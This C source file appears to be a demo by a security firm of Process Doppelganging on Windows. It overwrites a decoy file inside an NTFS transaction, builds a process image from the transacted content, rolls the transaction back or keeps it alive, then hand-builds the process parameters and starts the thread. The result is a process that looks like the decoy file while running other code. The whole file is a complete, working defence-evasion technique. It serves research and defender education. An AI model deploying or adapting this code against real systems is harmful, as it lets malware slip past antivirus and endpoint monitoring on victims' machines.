/*
 * Copyright (c) 2022 Hunt & Hackett.
 *
 * This demo project is licensed under the MIT license.
 *
 * Authors:
 *     diversenok
 *
 */

#define PHNT_VERSION PHNT_WIN11
#include <phnt_windows.h>
#include <phnt.h>
#include <stdio.h>

int wmain(int argc, wchar_t* argv[])
{
    NTSTATUS status;
    UNICODE_STRING sourceFileName = { 0 };
    UNICODE_STRING decoyFileName = { 0 };
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK isb;

    HANDLE hTransaction = NULL;
    HANDLE hSourceFile = NULL;
    HANDLE hSourceFileSection = NULL;
    PVOID sourceFileData = NULL;
    HANDLE hDecoyFile = NULL;
    HANDLE hImageSection = NULL;
    HANDLE hProcess = NULL;
    PRTL_USER_PROCESS_PARAMETERS parameters = NULL;

    wprintf_s(L"Demo for Process Doppelganging by Hunt & Hackett.\r\n\r\n");
    wprintf_s(L"Usage: Doppelganging.exe [decoy file] [source file] [[-k]]\r\n");
    wprintf_s(L" - Decoy File - the file that we overwrite in a transaction\r\n");
    wprintf_s(L" - Source File - the file that supplies the code to execute\r\n");
    wprintf_s(L" - Option: -k - keep the transaction active\r\n\r\n");

    if (argc < 2)
        return STATUS_INVALID_PARAMETER;
    
    if (argc >= 3)
    {
        // Convert the source filename to NT format
        status = RtlDosPathNameToNtPathName_U_WithStatus(
            argv[2],
            &sourceFileName,
            NULL,
            NULL
        );

        if (!NT_SUCCESS(status))
        {
            wprintf_s(L"RtlDosPathNameToNtPathName_U_WithStatus on source file: %x\r\n", status);
            goto CLEANUP;
        }
    }
    else
    {
        RtlInitUnicodeString(&sourceFileName, L"\\SystemRoot\\system32\\cmd.exe");
    }

    // Convert the decoy filename to NT format
    status = RtlDosPathNameToNtPathName_U_WithStatus(
        argv[1],
        &decoyFileName,
        NULL,
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"RtlDosPathNameToNtPathName_U_WithStatus on decoy file: %x\r\n", status);
        goto CLEANUP;
    }

    // Open the source file
    InitializeObjectAttributes(&objAttr, &sourceFileName, 0, NULL, NULL);
    status = NtOpenFile(
        &hSourceFile,
        FILE_READ_DATA | SYNCHRONIZE,
        &objAttr,
        &isb,
        FILE_SHARE_READ,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtOpenFile on the source file: %x\r\n", status);
        goto CLEANUP;
    }

    // Prepare to map it for copying
    status = NtCreateSection(
        &hSourceFileSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_COMMIT,
        hSourceFile
    );

    NtClose(hSourceFile);
    hSourceFile = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateSection on source file: %x\r\n", status);
        goto CLEANUP;
    }

    // Map the source file as a data stream
    SIZE_T sourceMappingSize;
    sourceMappingSize = 0;

    status = NtMapViewOfSection(
        hSourceFileSection,
        NtCurrentProcess(),
        &sourceFileData,
        0,
        0,
        NULL,
        &sourceMappingSize,
        ViewUnmap,
        0,
        PAGE_READONLY
    );

    NtClose(hSourceFileSection);
    hSourceFileSection = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtMapViewOfSection on source file: %x\r\n", status);
        goto CLEANUP;
    }

    // Create a filesystem transaction
    UNICODE_STRING description;
    RtlInitUnicodeString(&description, L"Doppelganging Transaction");

    status = NtCreateTransaction(
        &hTransaction,
        TRANSACTION_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        0,
        0,
        0,
        NULL,
        &description
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateTransaction: %x\r\n", status);
        goto CLEANUP;
    }

    // Perform all subsequent I/O operations inside the transaction
    RtlSetCurrentTransaction(hTransaction);

    // Open the decoy file
    InitializeObjectAttributes(&objAttr, &decoyFileName, 0, NULL, NULL);
    status = NtOpenFile(
        &hDecoyFile,
        FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
        &objAttr,
        &isb,
        FILE_SHARE_READ,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtOpenFile on the decoy file: %x\r\n", status);
        goto CLEANUP;
    }

    // Remove all existing content (transacted)
    FILE_END_OF_FILE_INFORMATION endOfFileInfo;
    endOfFileInfo.EndOfFile.QuadPart = 0;

    status = NtSetInformationFile(
        hDecoyFile,
        &isb,
        &endOfFileInfo,
        sizeof(endOfFileInfo),
        FileEndOfFileInformation
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtSetInformationFile for clearing the decoy file: %x\r\n", status);
        goto CLEANUP;
    }

    // Write the new content to the decoy file (transacted)
    status = NtWriteFile(
        hDecoyFile,
        NULL,
        NULL,
        NULL,
        &isb,
        sourceFileData,
        (ULONG)sourceMappingSize,
        NULL,
        NULL
    );

    NtUnmapViewOfSection(NtCurrentProcess(), sourceFileData);
    sourceFileData = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtWriteFile for the decoy file: %x\r\n", status);
        goto CLEANUP;
    }

    // Create an image section from the decoy file (transacted)
    status = NtCreateSection(
        &hImageSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hDecoyFile
    );

    NtClose(hDecoyFile);
    hDecoyFile = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateSection for the image: %x\r\n", status);
        return status;
    }

    // Create a process object
    status = NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        NULL,
        NtCurrentProcess(),
        0,
        hImageSection,
        NULL,
        NULL,
        0
    );

    NtClose(hImageSection);
    hImageSection = NULL;

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateProcessEx: %x\r\n", status);
        goto CLEANUP;
    }

    // Exit and roll back the transaction
    RtlSetCurrentTransaction(NULL);

    if (argc >= 4 && wcscmp(argv[3], L"-k") == 0)
    {
        // Send the transaction handle to the new process to keep it alive
        status = NtDuplicateObject(
            NtCurrentProcess(),
            hTransaction,
            hProcess,
            NULL,
            0,
            0,
            DUPLICATE_SAME_ACCESS
        );

        if (!NT_SUCCESS(status))
        {
            wprintf_s(L"NtDuplicateObject: %x\r\n", status);
            return status;
        }
    }
    else
    {
        // Abort the transaction
        status = NtRollbackTransaction(hTransaction, TRUE);

        if (!NT_SUCCESS(status))
        {
            wprintf_s(L"NtRollbackTransaction: %x\r\n", status);
            return status;
        }
    }

    // Determine its PEB location
    PROCESS_BASIC_INFORMATION processInfo;
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &processInfo,
        sizeof(processInfo),
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtQueryInformationProcess: %x\r\n", status);
        goto CLEANUP;
    }

    if (!processInfo.PebBaseAddress)
    {
        status = STATUS_ASSERTION_FAILURE;
        wprintf_s(L"PEB is NULL\r\n");
        goto CLEANUP;
    }


    // Prepare the process parameters block
    WCHAR imageNameBuffer[MAX_PATH];
    UNICODE_STRING imageName;
    UNICODE_STRING currentDir;
    UNICODE_STRING windowName;

    imageName.Buffer = imageNameBuffer;
    imageName.MaximumLength = sizeof(imageNameBuffer);
    imageName.Length = (USHORT)RtlGetFullPathName_U(argv[1], imageName.MaximumLength, &imageNameBuffer[0], NULL);

    RtlInitUnicodeString(&currentDir, L"C:\\Windows\\system32");
    RtlInitUnicodeString(&windowName, L"Hello from a doppelganger process!");

    status = RtlCreateProcessParametersEx(
        &parameters,
        &imageName,
        &currentDir,
        &currentDir,
        &imageName,
        RtlGetCurrentPeb()->ProcessParameters->Environment,
        &windowName,
        NULL,
        NULL,
        NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"RtlCreateProcessParametersEx: %x\r\n", status);
        goto CLEANUP;
    }

    // Allocate space for the process parameter block in the target
    SIZE_T paramsSize;
    PVOID paramsRemote;
    SIZE_T paramsRemoteSize;

    paramsSize = (SIZE_T)parameters->MaximumLength + parameters->EnvironmentSize;
    paramsRemote = NULL;
    paramsRemoteSize = paramsSize;

    status = NtAllocateVirtualMemory(
        hProcess,
        &paramsRemote,
        0,
        &paramsRemoteSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtAllocateVirtualMemory for process parameteres: %x\r\n", status);
        goto CLEANUP;
    }

    // Switch the process parameters to a denormalized form that uses offsets instead of
    // absolute pointers. The target's ntdll will normalize them back on initialization.
    RtlDeNormalizeProcessParams(parameters);

    // Unfortunately, denormalization doesn't apply to the environment pointer, so we need
    // to adjust it to be valid remotely.
    (ULONG_PTR)parameters->Environment += (ULONG_PTR)paramsRemote - (ULONG_PTR)parameters;

    // Write process parameters block to the target
    status = NtWriteVirtualMemory(hProcess, paramsRemote, parameters, paramsSize, NULL);
    RtlDestroyProcessParameters(parameters);

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtWriteVirtualMemory for process parameteres: %x\r\n", status);
        goto CLEANUP;
    }

    // Update the reference in PEB
    status = NtWriteVirtualMemory(
        hProcess,
        &processInfo.PebBaseAddress->ProcessParameters,
        &paramsRemote,
        sizeof(paramsRemote),
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtWriteVirtualMemory for process parameteres reference: %x\r\n", status);
        goto CLEANUP;
    }

    // Determine parameters for the initial thread
    SECTION_IMAGE_INFORMATION imageInfo;

    status = NtQueryInformationProcess(
        hProcess,
        ProcessImageInformation,
        &imageInfo,
        sizeof(imageInfo),
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtQueryInformationProcess for image info: %x\r\n", status);
        goto CLEANUP;
    }

    // Create the initial thread
    HANDLE hThread;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        imageInfo.TransferAddress,
        NULL,
        0,
        imageInfo.ZeroBits,
        imageInfo.CommittedStackSize,
        imageInfo.MaximumStackSize,
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        wprintf_s(L"NtCreateThreadEx: %x\r\n", status);
        goto CLEANUP;
    }

    NtClose(hProcess);
    hProcess = NULL;

    NtClose(hThread);
    hThread = NULL;

    status = STATUS_SUCCESS;
    wprintf_s(L"Successfully created process with PID %zu.\r\n",
        (ULONG_PTR)processInfo.UniqueProcessId);

CLEANUP:
    RtlSetCurrentTransaction(NULL);

    if (sourceFileName.Buffer && argc >= 3)
        RtlFreeUnicodeString(&sourceFileName);

    if (decoyFileName.Buffer)
        RtlFreeUnicodeString(&decoyFileName);

    if (hTransaction)
        NtClose(hTransaction);

    if (hSourceFile)
        NtClose(hSourceFile);

    if (hSourceFileSection)
        NtClose(hSourceFileSection);

    if (sourceFileData)
        NtUnmapViewOfSection(NtCurrentProcess(), sourceFileData);

    if (hDecoyFile)
        NtClose(hDecoyFile);

    if (hImageSection)
        NtClose(hImageSection);

    if (hProcess)
    {
        NtTerminateProcess(hProcess, STATUS_UNSUCCESSFUL);
        NtClose(hProcess);
    }

    return status;
}
